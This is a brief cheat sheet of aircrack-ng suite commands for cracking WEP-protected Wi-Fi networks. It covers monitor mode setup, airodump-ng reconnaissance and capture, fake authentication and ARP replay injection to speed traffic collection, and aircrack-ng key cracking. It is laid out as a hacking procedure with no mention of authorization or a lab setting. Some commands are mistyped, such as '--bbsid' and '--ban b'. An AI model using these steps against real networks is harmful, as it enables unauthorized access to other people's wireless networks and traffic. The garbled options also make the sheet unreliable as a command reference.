###### WI-FI WEP HACKING ######

Note: ALL ACTIONS MUST BE TAKEN IN ROOT OR USE SUDO AND WIFI ADAPTER MUST BE IN MONITOR MODE

########## MONITOR MODE SET-UP ###########

airmon-ng
airmon-ng start wlan0

##### RECONNAISANCE #######

airodump wlan0
TIP: The lower the power the closer the wireless acceess point.

airodump-ng --channel <channel number> --bbsid <router bssid> --write <Desiredfilename> wlan0
  
												                --> keep running until the end of the hack session.

airodump-ng -c <channel number> --bssid <router bssid> -w <file name / desired location (listfull directory)>

TIP: The BSSID number is also the device MAC address

airodump-ng --ban b wlan0 -->> Captures 2.4 GHz Traffic (suitable for WEP connection).


###### WEP ADVANCED TECHNIQUE ######

To hack a wep network we basically need as much traffic captured as possible
sometimes we may have a less busy network, we can speed up this process by sending in random packets into the network.



######## WEP FAKEAUTHENTICATION #######

aireplay-ng --fakeauth 0 -a <router_bssid> -h <wifi_card_mac_address> wlan0


######## WEP REPLAY ATTACK #######

aireplay-ng --arpreplay -b <router_bssid> -h <wifi_card_mac_address> wlan0



######### WEP CRACKING #########

aircrack-ng wifi.cap file (full path....if needed)
